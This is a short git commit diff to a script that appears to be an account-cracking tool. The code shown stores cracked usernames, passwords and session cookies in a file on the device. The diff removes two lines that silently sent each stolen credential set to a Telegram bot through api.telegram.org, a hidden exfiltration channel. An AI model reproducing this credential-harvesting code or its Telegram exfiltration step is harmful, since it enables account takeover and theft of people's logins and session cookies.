94e465b1a584770c66d40b7de307ac16e5201aef
tessterr <168154763+tessterr@users.noreply.github.com>
2024-05-23 21:14:58 +0530

    Update test1.py

--- test1.py
+++ test1.py
@@ -1251,8 +1251,6 @@ def m6(idf,pwv):
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
-            statusok = (f" {user} | {ps} | {coki} ")
-            requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1 
             break
     if 'lock' in reqx:
